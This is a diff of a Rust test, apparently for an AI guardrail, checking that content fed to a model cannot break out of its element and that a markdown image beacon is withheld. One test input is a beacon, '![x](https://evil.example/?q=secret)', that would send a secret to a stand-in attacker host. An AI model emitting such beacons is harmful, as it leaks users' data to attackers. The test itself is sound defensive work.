@@ -58,18 +58,13 @@ fn data_cannot_close_its_element_or_carry_instructions() {
     let capped = data("big", &"é".repeat(100), 51);
     assert!(capped.contains("truncated"));
 
-    // Rust macros next to a URL are ordinary code, not an image beacon.
-    let code = data(
-        "file",
-        "let v = vec![1];\n// see https://example.com/docs\n",
-        1024,
-    );
-    assert!(
-        code.contains("vec! [1]") && !code.contains("withheld"),
-        "{code}"
-    );
+    // Rust code reaches the model unchanged, even next to a URL; a real
+    // image beacon is withheld.
+    let source = "let r = routes![get(\"/\" => home)];\nlet v = vec![Vec::<u8>::new()];\n// see https://example.com/docs\n";
+    let code = data("file", source, 1024);
+    assert!(code.contains(source), "{code}");
     let beacon = data("file", "![x](https://evil.example/?q=secret)", 1024);
-    assert!(!beacon.contains("!["));
+    assert!(beacon.contains("content withheld") && !beacon.contains("evil"));
     assert_eq!(AiGuardrails::inspect(&beacon).threat(), None);
 }
 
